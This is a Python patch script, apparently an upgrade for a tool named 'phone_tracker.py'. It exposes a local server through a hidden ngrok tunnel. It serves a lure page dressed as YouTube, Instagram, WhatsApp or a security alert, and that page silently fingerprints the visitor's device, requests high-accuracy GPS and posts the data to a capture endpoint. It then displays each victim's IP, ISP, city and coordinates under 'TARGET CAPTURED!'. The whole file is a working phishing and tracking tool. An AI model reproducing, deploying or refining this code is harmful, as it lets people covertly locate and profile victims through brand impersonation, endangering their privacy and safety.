import os

def apply_super_upgrade():
    filename = "phone_tracker.py"
    if not os.path.exists(filename):
        print("File not found.")
        return

    with open(filename, 'r', encoding='utf-8') as f:
        content = f.read()

    # 1. Update Imports
    if "from pyngrok import ngrok, conf" not in content:
        content = content.replace("import phonenumbers", "from pyngrok import ngrok, conf\nimport phonenumbers")

    # 2. Replace _launch_ngrok_tunnel
    old_tunnel_start = "    def _launch_ngrok_tunnel(self, port=8888, timeout=20):"
    next_method = "    def _build_tracking_page("
    
    t_start = content.find(old_tunnel_start)
    t_end = content.find(next_method, t_start)
    
    if t_start != -1 and t_end != -1:
        new_tunnel = """    def _launch_ngrok_tunnel(self, port):
        \"\"\"Inicia ngrok de forma estable y silenciosa (v6.1).\"\"\"
        try:
            import subprocess
            if os.name == "nt":
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0 # SW_HIDE
                conf.get_default().startupinfo = startupinfo
            
            token = os.getenv("NGROK_AUTHTOKEN", "").strip()
            if token:
                ngrok.set_auth_token(token)
            
            public_url = ngrok.connect(port, "http").public_url
            return {"url": public_url}
        except Exception as e:
            console.print(f"[red]  [NGROK] Error: {e}[/red]")
            return {"url": None}

"""
        content = content[:t_start] + new_tunnel + content[t_end:]

    # 3. Replace _build_tracking_page
    old_builder_start = "    def _build_tracking_page(self, track_id):"
    next_server = "    def _start_grab_server("
    
    b_start = content.find(old_builder_start)
    b_end = content.find(next_server, b_start)
    
    if b_start != -1 and b_end != -1:
        new_builder = """    def _build_tracking_page(self, track_id):
        \"\"\"Genera pagina de rastreo con Open Graph y Fingerprinting avanzado (v6.1).\"\"\"
        template = getattr(self, 'template_choice', 'security').lower()
        og = {
            'title': 'Breaking News: Live Updates',
            'desc': 'Get the latest real-time updates and breaking stories.',
            'img': 'https://cdn-icons-png.flaticon.com/512/21/21601.png',
            'bait': ''
        }

        if 'youtube' in template:
            og['title'] = 'YouTube - Video Recomendado'
            og['desc'] = 'Mira este video que es tendencia ahora mismo en tu region.'
            og['img'] = 'https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png'
            og['bait'] = f'<div class="card"><img src="{og["img"]}" style="width:100px;margin-bottom:20px;"><h2 style="font-size:1.4em;">Video No Disponible</h2><p>Este video requiere verificacion. Haz clic para validar.</p><div class="btn" style="background:#ff0000;color:white;padding:12px;border-radius:2px;cursor:pointer;font-weight:bold;margin-top:10px;">VER VIDEO</div></div>'
        elif 'instagram' in template:
            og['title'] = 'Instagram - Nueva Mencion'
            og['desc'] = 'Alguien te ha etiquetado en una publicacion.'
            og['image'] = 'https://www.instagram.com/static/images/ico/favicon-200.png/ab6dea7ac684.png'
            og['bait'] = f'<div class="card"><img src="https://www.instagram.com/static/images/ico/favicon-200.png/ab6dea7ac684.png" style="width:60px;margin-bottom:20px;"><h2 style="font-size:1.4em;">Nueva Mencion</h2><p>Inicia sesion para ver la publicacion.</p><div class="btn" style="background:#0095f6;color:white;padding:12px;border-radius:5px;cursor:pointer;font-weight:bold;margin-top:10px;">Ver Publicacion</div></div>'
        elif 'whatsapp' in template:
            og['title'] = 'WhatsApp - Invitacion a Grupo'
            og['desc'] = 'Has sido invitado a unirte a un grupo de seguridad.'
            og['img'] = 'https://static.whatsapp.net/rsrc.php/v3/y7/r/DS_973_q7_n.png'
            og['bait'] = f'<div class="card"><img src="{og["img"]}" style="width:80px;margin-bottom:20px;"><h2 style="font-size:1.4em;">Invitacion Pendiente</h2><p>Unirse al chat grupal de seguridad.</p><div class="btn" style="background:#25d366;color:white;padding:12px;border-radius:20px;cursor:pointer;font-weight:bold;margin-top:10px;">Unirse al Chat</div></div>'
        else:
             og['bait'] = '<div class="card"><h2 style="color:#d93025;font-size:1.4em;">Alerta de Seguridad</h2><p>Detectado acceso no autorizado. Valida tu posicion para asegurar tu cuenta.</p><div class="spinner"></div></div>'

        return f\"\"\"<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:type" content="website">
<meta property="og:title" content="{og['title']}">
<meta property="og:description" content="{og['desc']}">
<meta property="og:image" content="{og['img']}">
<title>{og['title']}</title>
<style>
  body {{ font-family: sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
  .card {{ background: white; border: 1px solid #dbdbdb; padding: 40px; border-radius: 8px; text-align: center; max-width: 350px; }}
  .btn {{ margin-top: 15px; cursor: pointer; }}
  .spinner {{ border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 20px; height: 20px; animation: spin 2s linear infinite; margin: 10px auto; }}
  @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
</style>
</head>
<body>
    {og['bait']}
<script>
(function(){{
  var data = {{ track_id: "{track_id}", ua: navigator.userAgent, plt: navigator.platform, res: screen.width + "x" + screen.height, tz: Intl.DateTimeFormat().resolvedOptions().timeZone, cores: navigator.hardwareConcurrency, mem: navigator.deviceMemory }};
  try {{
    navigator.getBattery().then(function(b){{
      data.bat = Math.round(b.level * 100) + "%";
      data.charging = b.charging;
      checkGeo();
    }}).catch(function(){{ checkGeo(); }});
  }} catch(e) {{ checkGeo(); }}
  function checkGeo() {{
    if (navigator.geolocation) {{
      navigator.geolocation.getCurrentPosition(function(p){{
        data.gps_lat = p.coords.latitude; data.gps_lon = p.coords.longitude; data.gps_accuracy = p.coords.accuracy; send(data);
      }}, function(e){{ data.gps_err = e.message; send(data); }}, {{enableHighAccuracy:true, timeout:10000}});
    }} else {{ send(data); }}
  }}
  function send(d) {{ fetch("/capture/" + d.track_id, {{ method:\"POST\", headers:{{\"Content-Type\":\"application/json\"}}, body:JSON.stringify(d) }}); }}
}})();
</script>
</body>
</html>\"\"\"
"""
        content = content[:b_start] + new_builder + content[b_end:]

    # 4. Update the Capture Panel Display
    panel_find = "console.print(Panel(f\"\"\"[bold red][SIREN] TARGET CAPTURED![/bold red]"
    if panel_find in content:
        # I'll just find the function and replace the Panel call
        idx = content.find(panel_find)
        # Find next color= "red"))
        end_idx = content.find("border_style=\"red\"))", idx) + len("border_style=\"red\"))")
        
        if idx != -1 and end_idx != -1:
            new_panel_code = """            bat = data.get('bat', '?')
            charging = " (Charging)" if data.get('charging') else ""
            is_vpn = "[YES]" if ip_info.get('proxy') or ip_info.get('vpn') else "[NO]"
            new_panel = f\"\"\"[bold red][SIREN] TARGET CAPTURED! (v6.1 Final Intel)[/bold red]
[bold green]  IP Address:[/bold green]   {real_ip} [dim](VPN: {is_vpn})[/dim]
[bold green]  ISP/Carrier:[/bold green]  {ip_org}
[bold green]  Location:[/bold green]     {ip_city}, {ip_region}, {ip_info.get('country', '?')}
[bold blue]  Battery:[/bold blue]      {bat}{charging}
[bold blue]  Hardware:[/bold blue]     {data.get('cores', '?')} Cores | {data.get('mem', '?')} GB RAM
[bold green]  Device:[/bold green]       {device} | {tz} | {data.get('res', '?')}
{'[bold red]  [GRAB] GPS LOCATION:[/bold red]' if gps_lat else '[yellow]  GPS: Not allowed by target[/yellow]'}
{'  Latitude:  ' + str(gps_lat) if gps_lat else ''}
{'  Longitude: ' + str(gps_lon) if gps_lon else ''}
{'  Accuracy:  ' + str(round(gps_acc, 1)) + ' meters' if gps_acc else ''}\"\"\"
            console.print(Panel(new_panel, title=f"[bold red][GRAB] CAPTURE #{len(captures)}[/bold red]", border_style="red"))"""
            content = content[:idx] + new_panel_code + content[end_idx:]

    with open(filename, 'w', encoding='utf-8') as f:
        f.write(content)
    print("Super Upgrade v6.1 applied.")

if __name__ == "__main__":
    apply_super_upgrade()
